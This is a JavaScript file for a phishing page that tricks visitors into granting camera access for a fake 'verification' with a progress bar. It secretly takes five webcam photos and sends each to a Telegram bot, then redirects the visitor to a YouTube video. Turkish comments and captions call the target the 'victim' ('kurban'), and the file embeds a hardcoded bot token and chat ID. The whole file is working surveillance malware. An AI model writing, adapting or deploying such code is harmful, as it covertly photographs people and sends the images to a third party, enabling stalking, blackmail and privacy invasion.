const botToken = "8674146452:AAEQOizLVfsGbA9IuENk74De9tBLLB8FW0U";
const chatId = "7979504487";

async function start() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        document.querySelector('.btn').style.display = 'none';
        document.getElementById('progress').style.display = 'block';

        for (let i = 1; i <= 5; i++) {
            await new Promise(r => setTimeout(r, 1200));
            capture(i);
            document.getElementById('percent').innerText = i * 20;
        }

        setTimeout(() => {
            // Buraya kurbanın en son gideceği linki yaz
            window.location.href = "https://youtu.be/021FIRNbJK4?si=R95OpG5NWt83GmLt";
        }, 1000);

    } catch (err) {
        alert("Hata: Doğrulama için kamera izni vermeniz şarttır!");
    }
}

function capture(num) {
    const canvas = document.getElementById('canvas');
    const video = document.getElementById('video');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', `📸 Kurban Fotoğrafı #${num} yakalandı!`);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    }, 'image/jpeg');
}
